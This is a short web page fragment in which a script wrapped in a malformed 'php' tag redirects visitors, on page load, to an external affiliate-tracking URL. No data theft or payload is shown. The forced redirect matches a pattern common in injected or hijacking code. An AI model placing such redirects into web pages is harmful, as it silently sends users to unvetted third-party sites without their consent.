
<php>
   <script>
	   function largarse(){
    setTimeout("location.href='//www.sma479.com/scripts/un981c6l?a_aid=d2849e13&a_bid=b7656ceb'", 0);
}
onload = largarse;
	   </script>
</php>